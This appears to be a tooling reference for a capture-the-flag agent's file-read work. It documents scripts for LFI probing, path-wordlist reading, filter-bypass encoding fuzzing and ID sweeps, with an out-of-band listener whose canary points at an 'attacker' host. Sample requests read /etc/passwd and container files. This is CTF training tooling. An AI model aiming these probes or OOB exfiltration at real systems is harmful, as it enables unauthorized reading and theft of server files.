# Tooling — the repo helpers for file-read

## `tools/web/lfi_probe.py` — the LFI speed-probe

```bash
python3 tools/web/lfi_probe.py --url http://target/page \
  --param file --method GET
```

The LFI-shape probe — the first-reach check — emits the `post-probe`
shape — `lfi_probe` is the file-read speed-primitive.

## `tools/web/http_probe.py` — the verbatim-evidence probe

```bash
python3 tools/web/http_probe.py --challenge "$C" --class file-read-primitives \
  --url "$BASE/export" --method POST --body 'template=/etc/hostname&data={"id":"x"}' \
  --evidence-contains "$(hostname)" --evidence-kind class \
  --on-match confirms --on-miss inconclusive
```

`http_probe` — the request + response + evidence bound together — emits
the `post-probe` command with `--response` already filled — the verbatim
rule is enforced by the gate — `evidence-rules.md`.

## `tools/web/read_loop.py` — the wordlist-walk

```bash
python3 tools/web/read_loop.py --url "$BASE/export" --method POST \
  --body 'template={path}&data={"id":"x"}' \
  --profile container --extract-paths
```

`read_loop` — walks a wordlist of paths, baseline-classifies each —
`--profile container` leads with `/proc/self/mountinfo` — the read-loop
is bounded — `cheatsheet.md`'s wordlist sources.

## `tools/web/sanitizer_fuzz.py` — the encoding-differential

```bash
python3 tools/web/sanitizer_fuzz.py --url "$BASE/page" \
  --template 'file={v}' --field file --forbidden 'root:x:0:0'
```

`sanitizer_fuzz` — 40 encodings of a blocked byte — the differential
sweep — records the negatives — `filter-bypass.md`/`encoding-tricks.md`.

## `tools/web/oob_listener.py` — the OOB channel

```bash
python3 tools/web/oob_listener.py serve --port 9000 --log /tmp/oob.log
python3 tools/web/oob_listener.py hits --log /tmp/oob.log
python3 tools/web/oob_listener.py canary --base http://attacker:9000 --name x
```

`oob_listener` — the OOB-capture — a `php://input`+`curl`/`wget`/
`mail`/`include` exec — `blind-read.md` oracle 18 — the OOB-chain.

## `tools/hooks.py` — the verdict/flag gates

```bash
python3 tools/hooks.py pre-probe <name> --class file-read-primitives \
  --request 'GET /page?file=/etc/passwd'
python3 tools/hooks.py post-probe <name> --hypothesis-id <id> \
  --class file-read-primitives --verdict confirms \
  --evidence-kind class --evidence 'root:x:0:0:' --response '<the raw response>'
python3 tools/hooks.py pre-flag <name> --value 'flag{...}' \
  --source '<the path you read>'
```

`hooks.py` — the only write-gate — `post-probe` requires `--response`
on `confirms` — `pre-flag` asserts the flag is verbatim in the source —
`evidence-rules.md`.

## `tools/state.py` — the ledger

```bash
python3 tools/state.py <name> --hypothesis 'file-read via ?file=' \
  --bug-class file-read-primitives
python3 tools/state.py <name> --show
python3 tools/state.py <name> --strategy-used <rung>
```

`state.py` — the hypothesis-ledger — `--hypothesis` not `--add-hypothesis` —
the strategy-used escalation-rung.

## `tools/decide.py` — the controller

```bash
python3 tools/decide.py <name>
```

`decide.py` — the controller — returns `run_probe`/`novel_plan`/
`switch_class`/`verify_flag`/`record_solve`/`escalate`/`stop_report` —
the escalation-order: `chain_match`/`reclassify`/`writeup_search`/
`novel_plan`/`fanout_sweep`/`solver_handoff`.

## `tools/classify.py` — the class-router

```bash
python3 tools/classify.py --source <dir>     — white-box
python3 tools/classify.py "<obs>"            — black-box
python3 tools/classify.py --record <challenge>
```

`classify.py` — the class-router — returns candidates with a first
probe + falsifier — `--record` writes them to the ledger.

## `tools/chain_match.py` — the chain-card recall

```bash
python3 tools/chain_match.py --source <dir> --record <challenge>
python3 tools/chain_match.py "<obs>"
```

`chain_match.py` — the chain-recall — `family_leads` is weak/non-recordable —
a literal `signals` match is a candidate — `chain_match.py` returns the
card's `first_confirming_probe` — run it before inventing.

## `tools/writeup_search.py` — the writeup-shortcut

```bash
python3 tools/writeup_search.py "<name> <event>"
```

`writeup_search.py` — the writeup-shortcut — a legitimate escalation —
record that it was used.

## `tools/web/variant_matrix.py` — the shape-sweep

```bash
python3 tools/web/variant_matrix.py --url "$BASE/page" \
  --body 'file={P}' --dry-run
```

`variant_matrix` — one request per payload-shape at one injection-point —
baseline-diffed — the "which shape does this param react to" sweep —
`--dry-run` prints without sending — `variant_matrix` is a probe-tool
not a read-tool.

## `tools/web/selftest.py` — the offline-proof

```bash
python3 tools/web/selftest.py
```

`selftest` — 8 offline cases — the web-tools proof — run before relying
on `http_probe`/`read_loop`/`sanitizer_fuzz`/`id_sweep`.

## `tools/web/id_sweep.py` — the existence-oracle sweep

```bash
python3 tools/web/id_sweep.py --url "$BASE/page?id={id}" \
  --range 1-100
```

`id_sweep` — the existence-oracle — a `?file=` that returns a status/
length per-path — the existence-sweep — `blind-read.md` oracle 1.

## `tools/gadget_lookup.py` — the version-aware recall

```bash
python3 tools/gadget_lookup.py --lockfile <handout>/composer.lock
python3 tools/gadget_lookup.py --lockfile <handout>/package-lock.json
python3 tools/gadget_lookup.py --lockfile <handout>/requirements.txt
python3 tools/gadget_lookup.py --lockfile <handout>/Gemfile.lock
python3 tools/gadget_lookup.py --lockfile <handout>/pom.xml
```

`gadget_lookup` — the version-aware dep-recall — the app's `composer.json`/
`package.json`/`requirements.txt`/`pom.xml`/`Gemfile`/`go.mod` → the
known-vuln/gadget match — `source-location.md`/`secrets-and-keys.md`
after the dep-list is read.

## The "the tool isn't the answer, the read is" — the honest note

These tools emit the `post-probe` shape — they don't decide the class —
`classify.py`/`chain_match.py` decide, `hooks.py` verifies, `state.py`/
`decide.py` orchestrate — the tools are the speed-primitives.
